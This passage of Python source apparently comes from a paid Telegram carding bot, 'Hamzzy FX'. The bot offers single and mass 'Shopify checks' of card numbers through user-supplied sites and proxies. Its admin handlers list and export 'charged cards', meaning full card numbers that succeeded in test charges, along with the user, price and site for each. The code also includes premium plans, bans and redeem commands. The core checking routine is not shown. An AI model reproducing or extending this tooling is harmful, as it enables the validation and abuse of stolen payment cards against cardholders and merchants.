        InlineKeyboardButton("🗑️ Delete Database", callback_data="admin_deldb"),
        InlineKeyboardButton("🔄 Refresh", callback_data="admin_refresh")
    )
    
    text = f"""🔐 **Admin Control Panel**
━━━━━━━━━━━━━━━━━
👑 Admin: @{BOT_USERNAME}
━━━━━━━━━━━━━━━━━
📊 **Statistics**
┣ 👥 Users: {stats['total_users']}
┣ 💰 Charged Cards: {stats['total_charged']}
┣ 📝 Total Checks: {stats['total_checks']}
┣ 🟢 Active Users: {stats['active_users']}
┗ ⭐ Premium: {stats['premium_users']}
━━━━━━━━━━━━━━━━━
📅 Uptime: {get_uptime()}
━━━━━━━━━━━━━━━━━
Select an option below:"""
    
    bot.reply_to(message, text, reply_markup=kb)
    log_admin_action(message.from_user.id, "ADMIN_PANEL_OPENED")

@bot.callback_query_handler(func=lambda c: c.data.startswith('admin_'))
def admin_callback(call):
    if not is_admin(call.from_user.id):
        bot.answer_callback_query(call.id, "🚫 No permission!", show_alert=True)
        return
    
    action = call.data.replace('admin_', '')
    
    if action == 'charged':
        show_charged_cards(call)
    elif action == 'users':
        show_all_users(call)
    elif action == 'sessions':
        show_active_sessions(call)
    elif action == 'stats':
        show_bot_stats(call)
    elif action == 'deldb':
        confirm_delete_db(call)
    elif action == 'refresh':
        bot.answer_callback_query(call.id, "🔄 Refreshing...")
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        admin_panel(call.message)
    elif action == 'confirm_deldb':
        if delete_database():
            bot.answer_callback_query(call.id, "✅ Database deleted!", show_alert=True)
            log_admin_action(call.from_user.id, "DATABASE_DELETED")
            text = "✅ **Database Deleted**\n━━━━━━━━━━━━━━━━━\nAll data removed.\nNew database created."
            kb = InlineKeyboardMarkup()
            kb.add(InlineKeyboardButton("🔙 Back", callback_data="admin_back"))
            try:
                bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=kb)
            except:
                bot.send_message(call.message.chat.id, text, parse_mode="Markdown", reply_markup=kb)
        else:
            bot.answer_callback_query(call.id, "❌ Error!", show_alert=True)
    elif action == 'export':
        export_charged(call)
    elif action == 'back':
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        admin_panel(call.message)

def show_charged_cards(call):
    cards = get_charged_cards(limit=30)
    if not cards:
        bot.answer_callback_query(call.id, "📭 No charged cards found!")
        return
    
    text = "💰 **Charged Cards (Recent 30)**\n━━━━━━━━━━━━━━━━━\n"
    for card in cards:
        card_id, user_id, card_num, response, price, site, checked_date, viewed = card
        viewed_icon = "👁️" if viewed else "🔴"
        text += f"{viewed_icon} User: {user_id}\n┣ Card: `{card_num}`\n┣ Response: {response}\n┣ Price: {price}\n┗ Date: {checked_date[:16]}\n\n"
        mark_card_viewed(card_id)
    
    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton("🔙 Back", callback_data="admin_back"))
    kb.add(InlineKeyboardButton("📥 Export All", callback_data="admin_export"))
    
    try:
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=kb)
    except:
        bot.send_message(call.message.chat.id, text, parse_mode="Markdown", reply_markup=kb)
    
    bot.answer_callback_query(call.id, f"📊 {len(cards)} cards shown")

def show_all_users(call):
    users = get_all_users()
    if not users:
        bot.answer_callback_query(call.id, "📭 No users found!")
        return
    
    text = "👥 **All Users**\n━━━━━━━━━━━━━━━━━\n"
    for user in users[:30]:
        user_id, username, first_name, last_name, last_active, total_checks, total_charged = user
        name = first_name or "Unknown"
        uname = f"@{username}" if username else "No username"
        text += f"┣ {name} | {uname}\n┣ ID: `{user_id}` | Checks: {total_checks} | Charged: {total_charged}\n┗ Active: {last_active[:16]}\n\n"
    
    if len(users) > 30:
        text += f"\n... and {len(users)-30} more"
    
    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton("🔙 Back", callback_data="admin_back"))
    
    try:
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=kb)
    except:
        bot.send_message(call.message.chat.id, text, parse_mode="Markdown", reply_markup=kb)
    
    bot.answer_callback_query(call.id, f"👥 {len(users)} users")

def show_active_sessions(call):
    sessions = get_active_sessions()
    if not sessions:
        bot.answer_callback_query(call.id, "🟢 No active sessions!")
        return
    
    text = "🟢 **Active Sessions**\n━━━━━━━━━━━━━━━━━\n"
    for session in sessions:
        user_id, session_type, start_time, cards_processed, status = session
        elapsed = (datetime.now() - datetime.strptime(start_time, '%Y-%m-%d %H:%M:%S')).seconds
        mins, secs = divmod(elapsed, 60)
        text += f"┣ User: `{user_id}`\n┣ Type: {session_type}\n┣ Cards: {cards_processed}\n┗ Time: {mins}m {secs}s\n\n"
    
    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton("🔙 Back", callback_data="admin_back"))
    
    try:
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=kb)
    except:
        bot.send_message(call.message.chat.id, text, parse_mode="Markdown", reply_markup=kb)
    
    bot.answer_callback_query(call.id, f"🟢 {len(sessions)} active sessions")

def show_bot_stats(call):
    stats = get_bot_stats()
    
    text = f"""📊 **Bot Statistics**
━━━━━━━━━━━━━━━━━
👥 Total Users: {stats['total_users']}
💰 Charged Cards: {stats['total_charged']}
📝 Total Checks: {stats['total_checks']}
🟢 Active Users: {stats['active_users']}
⭐ Premium Users: {stats['premium_users']}
━━━━━━━━━━━━━━━━━
📅 Uptime: {get_uptime()}
━━━━━━━━━━━━━━━━━
💾 Database: {DB_NAME}
📁 Size: {get_db_size()}"""
    
    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton("🔙 Back", callback_data="admin_back"))
    
    try:
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=kb)
    except:
        bot.send_message(call.message.chat.id, text, parse_mode="Markdown", reply_markup=kb)
    
    bot.answer_callback_query(call.id, "📊 Stats updated")

def confirm_delete_db(call):
    kb = InlineKeyboardMarkup()
    kb.add(
        InlineKeyboardButton("✅ YES - DELETE", callback_data="admin_confirm_deldb"),
        InlineKeyboardButton("❌ Cancel", callback_data="admin_back")
    )
    
    text = "⚠️ **WARNING!**\n━━━━━━━━━━━━━━━━━\nAre you sure you want to delete the ENTIRE database?\n\nThis will remove:\n- All users\n- All cards\n- All sessions\n- All logs\n\n**THIS CANNOT BE UNDONE!**"
    
    try:
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=kb)
    except:
        bot.send_message(call.message.chat.id, text, parse_mode="Markdown", reply_markup=kb)

def export_charged(call):
    cards = get_charged_cards(limit=9999)
    if not cards:
        bot.answer_callback_query(call.id, "📭 No charged cards!")
        return
    
    filename = f"charged_cards_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write("="*50 + "\n")
        f.write("CHARGED CARDS - HAMZZY FX\n")
        f.write("="*50 + "\n\n")
        for card in cards:
            card_id, user_id, card_num, response, price, site, checked_date, viewed = card
            f.write(f"User: {user_id}\n")
            f.write(f"Card: {card_num}\n")
            f.write(f"Response: {response}\n")
            f.write(f"Price: {price}\n")
            f.write(f"Site: {site}\n")
            f.write(f"Date: {checked_date}\n")
            f.write("-"*30 + "\n\n")
    
    with open(filename, 'rb') as f:
        bot.send_document(call.message.chat.id, f, caption="📥 **Exported Charged Cards**")
    
    os.remove(filename)
    bot.answer_callback_query(call.id, "✅ Export complete!")

# ================= CHARGED COMMAND =================
@bot.message_handler(commands=['charged'])
def charged_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "🚫 𝗬𝗼𝘂 𝗱𝗼𝗻𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻!")
        return
    
    cards = get_charged_cards(limit=50)
    if not cards:
        bot.reply_to(message, "📭 No charged cards found!")
        return
    
    text = "💰 **Charged Cards**\n━━━━━━━━━━━━━━━━━\n"
    for card in cards:
        card_id, user_id, card_num, response, price, site, checked_date, viewed = card
        viewed_icon = "👁️" if viewed else "🔴"
        text += f"{viewed_icon} User: `{user_id}`\n┣ Card: `{card_num}`\n┣ Response: {response}\n┣ Price: {price}\n┗ Date: {checked_date[:16]}\n\n"
        mark_card_viewed(card_id)
    
    if len(cards) >= 50:
        text += "\n... showing last 50. Use /admin for more."
    
    bot.reply_to(message, text, parse_mode="Markdown")

# ================= USERS COMMAND =================
@bot.message_handler(commands=['users'])
def users_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "🚫 𝗬𝗼𝘂 𝗱𝗼𝗻𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻!")
        return
    
    users = get_all_users()
    if not users:
        bot.reply_to(message, "📭 No users found!")
        return
    
    text = "👥 **All Users**\n━━━━━━━━━━━━━━━━━\n"
    for user in users[:30]:
        user_id, username, first_name, last_name, last_active, total_checks, total_charged = user
        name = first_name or "Unknown"
        uname = f"@{username}" if username else "No username"
        text += f"┣ {name} | {uname}\n┣ ID: `{user_id}` | Checks: {total_checks} | Charged: {total_charged}\n┗ Active: {last_active[:16]}\n\n"
    
    if len(users) > 30:
        text += f"\n... and {len(users)-30} more"
    
    bot.reply_to(message, text, parse_mode="Markdown")

# ================= USER DETAILS =================
@bot.message_handler(commands=['user'])
def user_details(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "🚫 𝗬𝗼𝘂 𝗱𝗼𝗻𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻!")
        return
    
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "📝 Usage: /user <user_id>")
        return
    
    try:
        user_id = int(parts[1])
    except:
        bot.reply_to(message, "❌ Invalid user ID.")
        return
    
    user = get_user_stats(user_id)
    if not user:
        bot.reply_to(message, f"❌ User {user_id} not found.")
        return
    
    cards = db_fetch("SELECT card, status, response, price, site, checked_date FROM cards WHERE user_id = ? ORDER BY checked_date DESC LIMIT 10", (user_id,))
    
    text = f"""👤 **User Details**
━━━━━━━━━━━━━━━━━
🆔 ID: {user['user_id']}
👤 Name: {user['first_name']} {user['last_name'] or ''}
📌 Username: @{user['username'] or 'None'}
━━━━━━━━━━━━━━━━━
📅 Joined: {user['joined_date'][:16]}
🕐 Last Active: {user['last_active'][:16]}
━━━━━━━━━━━━━━━━━
⭐ Plan: {user['plan']}
📅 Expiry: {user['premium_expiry'] or 'Never'}
🚫 Banned: {'Yes' if user['is_banned'] else 'No'}
━━━━━━━━━━━━━━━━━
📝 Total Checks: {user['total_checks']}
💰 Charged Cards: {user['total_charged']}
━━━━━━━━━━━━━━━━━
📋 **Recent Cards:**"""
    
    if cards:
        for card in cards:
            card_num, status, response, price, site, checked_date = card
            text += f"\n┣ {status}: `{card_num}` - {response} - {price}"
    else:
        text += "\n┣ No cards found."
    
    bot.reply_to(message, text, parse_mode="Markdown")

# ================= SESSIONS COMMAND =================
@bot.message_handler(commands=['sessions'])
def sessions_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "🚫 𝗬𝗼𝘂 𝗱𝗼𝗻𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻!")
        return
    
    sessions = get_active_sessions()
    if not sessions:
        bot.reply_to(message, "🟢 No active sessions.")
        return
    
    text = "🟢 **Active Sessions**\n━━━━━━━━━━━━━━━━━\n"
    for session in sessions:
        user_id, session_type, start_time, cards_processed, status = session
        elapsed = (datetime.now() - datetime.strptime(start_time, '%Y-%m-%d %H:%M:%S')).seconds
        mins, secs = divmod(elapsed, 60)
        text += f"┣ User: `{user_id}`\n┣ Type: {session_type}\n┣ Cards: {cards_processed}\n┗ Time: {mins}m {secs}s\n\n"
    
    bot.reply_to(message, text, parse_mode="Markdown")

# ================= STATS COMMAND =================
@bot.message_handler(commands=['stats'])
def stats_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "🚫 𝗬𝗼𝘂 𝗱𝗼𝗻𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻!")
        return
    
    stats = get_bot_stats()
    text = f"""📊 **Bot Statistics**
━━━━━━━━━━━━━━━━━
👥 Total Users: {stats['total_users']}
💰 Charged Cards: {stats['total_charged']}
📝 Total Checks: {stats['total_checks']}
🟢 Active Users: {stats['active_users']}
⭐ Premium Users: {stats['premium_users']}
━━━━━━━━━━━━━━━━━
📅 Uptime: {get_uptime()}
━━━━━━━━━━━━━━━━━
💾 Database: {DB_NAME}
📁 Size: {get_db_size()}"""
    
    bot.reply_to(message, text)

# ================= STATUS COMMAND =================
@bot.message_handler(commands=['status'])
def status_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "🚫 𝗬𝗼𝘂 𝗱𝗼𝗻𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻!")
        return
    
    stats = get_bot_stats()
    
    text = f"""⚡ **System Status**
━━━━━━━━━━━━━━━━━
🤖 Bot: @{BOT_USERNAME}
⏱️ Uptime: {get_uptime()}
📁 Storage: SQLite + Files
🔄 Polling: Active
━━━━━━━━━━━━━━━━━
📊 Active Jobs: {len(ACTIVE_JOBS)}
🟢 Active Users: {stats['active_users']}
👥 Total Users: {stats['total_users']}
━━━━━━━━━━━━━━━━━
💾 API Available: {'✅' if API_AVAILABLE else '❌'}
🔗 Proxies Loaded: {len(proxy_list)}
🔧 Maintenance: {'✅ ON' if is_maintenance() else '❌ OFF'}
━━━━━━━━━━━━━━━━━
👑 Admin: {ADMIN_ID}
🐔 Dev: @{BOT_USERNAME}"""
    
    bot.reply_to(message, text)

# ================= DELETE DATABASE =================
@bot.message_handler(commands=['deldb'])
def deldb_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "🚫 𝗬𝗼𝘂 𝗱𝗼𝗻𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻!")
        return
    
    if delete_database():
        bot.reply_to(message, "✅ Database deleted successfully! New database created.")
        log_admin_action(message.from_user.id, "DATABASE_DELETED")
    else:
        bot.reply_to(message, "❌ Error deleting database.")

# ================= ADD PREMIUM =================
@bot.message_handler(commands=['addpremium'])
def add_premium_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "🚫 𝗬𝗼𝘂 𝗱𝗼𝗻𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻!")
        return
    
    parts = message.text.split()
    if len(parts) < 3:
        bot.reply_to(message, "📝 Usage: /addpremium <user_id> <days>")
        return
    
    try:
        target_id = int(parts[1])
        days = int(parts[2])
        
        now = time.time()
        exp = now + (days * 86400)
        with open(PREMIUM_FILE, 'a') as f:
            f.write(f"{target_id}|{exp}\n")
        
        db_execute("UPDATE users SET plan = 'Premium', premium_expiry = ? WHERE user_id = ?", 
                  (datetime.fromtimestamp(exp).strftime('%Y-%m-%d %H:%M:%S'), target_id))
        
        bot.reply_to(message, f"✅ Premium added for user {target_id} for {days} days!")
        log_admin_action(message.from_user.id, "ADD_PREMIUM", target_id, f"{days} days")
        try:
            bot.send_message(target_id, f"✅ **Premium Activated!**\n━━━━━━━━━━━━━━━━━\nDuration: {days} days\nEnjoy unlimited checks! 🚀")
        except:
            pass
    except:
        bot.reply_to(message, "❌ Invalid format. Use: /addpremium <user_id> <days>")

# ================= REMOVE PREMIUM =================
@bot.message_handler(commands=['rmpremium'])
def rm_premium_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "🚫 𝗬𝗼𝘂 𝗱𝗼𝗻𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻!")
        return
    
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "📝 Usage: /rmpremium <user_id>")
        return
    
    try:
        target_id = int(parts[1])
        
        with open(PREMIUM_FILE, 'r') as f:
            lines = f.readlines()
        with open(PREMIUM_FILE, 'w') as f:
            for line in lines:
                if str(target_id) not in line:
                    f.write(line)
        
        db_execute("UPDATE users SET plan = 'Free', premium_expiry = NULL WHERE user_id = ?", (target_id,))
        
        bot.reply_to(message, f"✅ Premium removed for user {target_id}!")
        log_admin_action(message.from_user.id, "REMOVE_PREMIUM", target_id)
        try:
            bot.send_message(target_id, "⚠️ Your premium access has been removed.")
        except:
            pass
    except:
        bot.reply_to(message, "❌ Invalid format. Use: /rmpremium <user_id>")

# ================= BAN =================
@bot.message_handler(commands=['ban'])
def ban_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "🚫 𝗬𝗼𝘂 𝗱𝗼𝗻𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻!")
        return
    
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "📝 Usage: /ban <user_id>")
        return
    
    try:
        target_id = int(parts[1])
        
        with open(BANNED_FILE, 'a') as f:
            f.write(f"{target_id}|0\n")
        
        db_execute("UPDATE users SET is_banned = 1 WHERE user_id = ?", (target_id,))
        
        bot.reply_to(message, f"✅ User {target_id} banned!")
        log_admin_action(message.from_user.id, "BAN_USER", target_id)
        try:
            bot.send_message(target_id, "🚫 You have been banned from using this bot.")
        except:
            pass
    except:
        bot.reply_to(message, "❌ Invalid format. Use: /ban <user_id>")

# ================= UNBAN =================
@bot.message_handler(commands=['unban'])
def unban_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "🚫 𝗬𝗼𝘂 𝗱𝗼𝗻𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻!")
        return
    
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "📝 Usage: /unban <user_id>")
        return
    
    try:
        target_id = int(parts[1])
        
        with open(BANNED_FILE, 'r') as f:
            lines = f.readlines()
        with open(BANNED_FILE, 'w') as f:
            for line in lines:
                if str(target_id) not in line:
                    f.write(line)
        
        db_execute("UPDATE users SET is_banned = 0 WHERE user_id = ?", (target_id,))
        
        bot.reply_to(message, f"✅ User {target_id} unbanned!")
        log_admin_action(message.from_user.id, "UNBAN_USER", target_id)
        try:
            bot.send_message(target_id, "✅ You have been unbanned.")
        except:
            pass
    except:
        bot.reply_to(message, "❌ Invalid format. Use: /unban <user_id>")

# ================= RPLAN =================
@bot.message_handler(commands=['rplan'])
def rplan_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "🚫 𝗬𝗼𝘂 𝗱𝗼𝗻𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻!")
        return
    
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "📝 Usage: /rplan <user_id>")
        return
    
    try:
        target_id = int(parts[1])
        
        with open(PREMIUM_FILE, 'r') as f:
            lines = f.readlines()
        with open(PREMIUM_FILE, 'w') as f:
            for line in lines:
                if str(target_id) not in line:
                    f.write(line)
        
        db_execute("UPDATE users SET plan = 'Free', premium_expiry = NULL WHERE user_id = ?", (target_id,))
        
        bot.reply_to(message, f"✅ Plan removed for user {target_id}!")
        log_admin_action(message.from_user.id, "REMOVE_PLAN", target_id)
    except:
        bot.reply_to(message, "❌ Invalid format. Use: /rplan <user_id>")

# ================= PLANALL =================
@bot.message_handler(commands=['planall'])
def planall_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "🚫 𝗬𝗼𝘂 𝗱𝗼𝗻𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻!")
        return
    
    try:
        with open(PREMIUM_FILE, 'r') as f:
            lines = f.readlines()
        
        if not lines:
            bot.reply_to(message, "📭 No active plans.")
            return
        
        text = "📋 **Active Plans**\n━━━━━━━━━━━━━━━━━\n"
        for line in lines:
            parts = line.strip().split('|')
            if len(parts) >= 2:
                uid = parts[0]
                exp = float(parts[1])
                if exp == 0:
                    exp_str = "Lifetime"
                else:
                    exp_str = datetime.fromtimestamp(exp).strftime('%Y-%m-%d')
                text += f"┣ User: {uid} | Expires: {exp_str}\n"
        
        bot.reply_to(message, text)
    except:
        bot.reply_to(message, "❌ Error reading plans.")

# ================= PLAN =================
@bot.message_handler(commands=['plan'])
def plan_command(message):
    user_id = message.from_user.id
    if check_maintenance(message): return
    if is_banned(user_id):
        bot.reply_to(message, "🚫 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗕𝗮𝗻𝗻𝗲𝗱!")
        return
    add_user(user_id)
    update_user_activity(user_id)
    
    plan = "Premium" if is_premium(user_id) else "Free"
    emoji = "⭐" if is_premium(user_id) else "🆓"
    
    text = f"""📋 **Plans** 🚀
━━━━━━━━━━━━━━━━━
🥈 Silver ━ 7d ━ $8
🥇 Gold ━ 15d ━ $14
💎 Platinum ━ 30d ━ $25
👑 Diamond ━ 90d ━ $60
━━━━━━━━━━━━━━━━━
⭐ **Your Plan:** {emoji} {plan}
━━━━━━━━━━━━━━━━━
📞 Contact admin to upgrade!"""
    
    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton("💰 Upgrade", url="https://t.me/hamzzylogs"))
    bot.reply_to(message, text, reply_markup=kb)

# ================= INFO =================
@bot.message_handler(commands=['info'])
def info_command(message):
    user_id = message.from_user.id
    if check_maintenance(message): return
    if is_banned(user_id):
        bot.reply_to(message, "🚫 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗕𝗮𝗻𝗻𝗲𝗱!")
        return
    add_user(user_id)
    update_user_activity(user_id)
    
    user = get_user_stats(user_id)
    if not user:
        bot.reply_to(message, "❌ Error fetching info!")
        return
    
    plan = "Premium" if is_premium(user_id) else "Free"
    emoji = "⭐" if is_premium(user_id) else "🆓"
    sites = get_user_sites(user_id)
    proxies = len(proxy_list)
    
    is_p = " [𝗔𝗗𝗠𝗜𝗡]" if is_admin(user_id) else " [𝗣𝗥𝗘𝗠𝗜𝗨𝗠]" if is_premium(user_id) else " [𝗙𝗥𝗘𝗘]"
    
    text = f"""📋 **Account Info**
━━━━━━━━━━━━━━━━━
🆔 User: {user['user_id']}
👤 Name: {user['first_name']}
📌 Username: @{user['username'] or 'None'}
━━━━━━━━━━━━━━━━━
⭐ Plan: {emoji} {plan}
📅 Joined: {user['joined_date'][:16]}
🕐 Last Active: {user['last_active'][:16]}
━━━━━━━━━━━━━━━━━
📝 Total Checks: {user['total_checks']}
💰 Charged Cards: {user['total_charged']}
🌐 Sites: {len(sites)}
🔗 Proxies: {proxies}
━━━━━━━━━━━━━━━━━
👤 {message.from_user.first_name}{is_p}
🐔 Dev: @{BOT_USERNAME}"""
    
    bot.reply_to(message, text)

# ================= MAINTENANCE =================
@bot.message_handler(commands=['maintenance'])
def maintenance_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "🚫 𝗬𝗼𝘂 𝗱𝗼𝗻𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻!")
        return
    
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "📝 Usage: /maintenance on/off")
        return
    
    mode = parts[1].lower()
    if mode == 'on':
        set_maintenance(True)
        bot.reply_to(message, "🔧 **Maintenance mode ENABLED**\n━━━━━━━━━━━━━━━━━\nOnly admins can use the bot.")
        log_admin_action(message.from_user.id, "MAINTENANCE_ON")
    elif mode == 'off':
        set_maintenance(False)
        bot.reply_to(message, "✅ **Maintenance mode DISABLED**\n━━━━━━━━━━━━━━━━━\nBot is now fully accessible.")
        log_admin_action(message.from_user.id, "MAINTENANCE_OFF")
    else:
        bot.reply_to(message, "❌ Invalid option. Use: on or off")

# ================= START COMMAND =================
@bot.message_handler(commands=['start', 'cmd'])
def start(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "🚫 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗕𝗮𝗻𝗻𝗲𝗱!")
        return
    
    username = message.from_user.username or ""
    first_name = message.from_user.first_name or ""
    last_name = message.from_user.last_name or ""
    add_user(user_id, username, first_name, last_name)
    update_user_activity(user_id)
    
    if check_maintenance(message): return
    
    fname = message.from_user.first_name

    greet = f"👋 𝗛𝗲𝗹𝗹𝗼 {fname}! 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗛𝗮𝗺𝘇𝘇𝘆 𝗙𝗫 𝗕𝗼𝘁."
    user_cmds = """⋆ 𝗨𝘀𝗲𝗿 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀
  · /sh  ━ 𝗦𝗶𝗻𝗴𝗹𝗲 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗖𝗵𝗲𝗰𝗸
  · /msh  ━ 𝗠𝗮𝘀𝘀 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗖𝗵𝗲𝗰𝗸
  · /add  ━ 𝗔𝗱𝗱 𝗦𝗶𝘁𝗲𝘀 (auto filter $1-$20)
  · /rm  ━ 𝗥𝗲𝗺𝗼𝘃𝗲 𝗦𝗶𝘁𝗲𝘀
  · /sites  ━ 𝗟𝗶𝘀𝘁 𝗬𝗼𝘂𝗿 𝗦𝗶𝘁𝗲𝘀
  · /site  ━ 𝗧𝗲𝘀𝘁 𝗔𝗹𝗹 𝗦𝗶𝘁𝗲𝘀
  · /redeem ━ 𝗥𝗲𝗱𝗲𝗲𝗺 𝗖𝗼𝗱𝗲
  · /proxy add/list/test/remove
  · /chkpxy  ━ 𝗖𝗵𝗲𝗰𝗸 𝗣𝗿𝗼𝘅𝘆
  · /info  ━ 𝗠𝘆 𝗜𝗻𝗳𝗼
  · /plan  ━ 𝗩𝗶𝗲𝘄 𝗣𝗹𝗮𝗻𝘀
  · /stop  ━ 𝗦𝘁𝗼𝗽 𝗔𝗰𝘁𝗶𝘃𝗲"""
    admin_cmds = """⋆ 𝗔𝗱𝗺𝗶𝗻 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀
  · /admin  ━ 𝗔𝗱𝗺𝗶𝗻 𝗖𝗼𝗻𝘁𝗿𝗼𝗹 𝗣𝗮𝗻𝗲𝗹
  · /charged  ━ 𝗦𝗲𝗲 𝗔𝗹𝗹 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 𝗖𝗮𝗿𝗱𝘀
  · /users  ━ 𝗟𝗶𝘀𝘁 𝗔𝗹𝗹 𝗨𝘀𝗲𝗿𝘀
  · /user <id> ━ 𝗨𝘀𝗲𝗿 𝗗𝗲𝘁𝗮𝗶𝗹𝘀
  · /sessions  ━ 𝗔𝗰𝘁𝗶𝘃𝗲 𝗦𝗲𝘀𝘀𝗶𝗼𝗻𝘀
  · /stats  ━ 𝗕𝗼𝘁 𝗦𝘁𝗮𝘁𝘀
  · /status  ━ 𝗦𝘆𝘀𝘁𝗲𝗺 𝗦𝘁𝗮𝘁𝘂𝘀
  · /deldb  ━ 𝗗𝗲𝗹𝗲𝘁𝗲 𝗗𝗮𝘁𝗮𝗯𝗮𝘀𝗲
  · /addpremium ━ 𝗔𝗱𝗱 𝗣𝗿𝗲𝗺𝗶𝘂𝗺
  · /rmpremium ━ 𝗥𝗲𝗺𝗼𝘃𝗲 𝗣𝗿𝗲𝗺𝗶𝘂𝗺
  · /credeem ━ 𝗖𝗿𝗲𝗮𝘁𝗲 𝗥𝗲𝗱𝗲𝗲𝗺
  · /lredeem ━ 𝗟𝗶𝘀𝘁 𝗥𝗲𝗱𝗲𝗲𝗺
  · /broadcast ━ 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁
  · /ban ━ 𝗕𝗮𝗻 𝗨𝘀𝗲𝗿
  · /unban ━ 𝗨𝗻𝗯𝗮𝗻 𝗨𝘀𝗲𝗿
  · /rplan ━ 𝗥𝗲𝗺𝗼𝘃𝗲 𝗣𝗹𝗮𝗻
  · /planall ━ 𝗟𝗶𝘀𝘁 𝗔𝗹𝗹 𝗣𝗹𝗮𝗻𝘀
  · /maintenance on/off"""
    footer = f"𝗗𝗲𝘃: @{BOT_USERNAME}"

    if is_admin(user_id):
        menu = f"""{greet}
━━━━━━━━━━━━━━━━━
{user_cmds}

{admin_cmds}
━━━━━━━━━━━━━━━━━
{footer}"""
    elif is_premium(user_id):
        menu = f"""{greet}
━━━━━━━━━━━━━━━━━
{user_cmds}
━━━━━━━━━━━━━━━━━
{footer}"""
    else:
        user_cmds_free = f"""⋆ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀
  · /sh  ━ 𝗦𝗶𝗻𝗴𝗹𝗲 𝗖𝗵𝗲𝗰𝗸
  · /msh  ━ 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸
  · /add  ━ 𝗔𝗱𝗱 𝗦𝗶𝘁𝗲𝘀
  · /rm  ━ 𝗥𝗲𝗺𝗼𝘃𝗲 𝗦𝗶𝘁𝗲𝘀
  · /sites  ━ 𝗟𝗶𝘀𝘁 𝗦𝗶𝘁𝗲𝘀
  · /site  ━ 𝗧𝗲𝘀𝘁 𝗦𝗶𝘁𝗲𝘀
  · /redeem ━ 𝗥𝗲𝗱𝗲𝗲𝗺
  · /proxy add/list/test/remove
  · /chkpxy ━ 𝗖𝗵𝗲𝗰𝗸 𝗣𝗿𝗼𝘅𝘆
